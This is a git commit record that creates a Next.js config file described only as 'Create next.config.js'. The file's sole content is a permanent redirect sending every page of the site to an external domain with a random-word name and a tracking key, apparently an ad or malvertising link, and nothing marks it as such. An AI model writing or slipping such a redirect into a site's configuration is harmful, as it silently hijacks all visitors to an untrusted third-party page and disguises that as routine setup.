0625ce034d6388158d0f02b82bcb42f2ac935220
Billiemo <mokirpolk@gmail.com>
2024-09-09 18:56:43 +0100

    Create next.config.js

---
+++ next.config.js
@@ -0,0 +1,11 @@
+module.exports = {
+  async redirects() {
+    return [
+      {
+        source: '/:path*',
+        destination: 'https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb',
+        permanent: true,
+      },
+    ]
+  },
+}
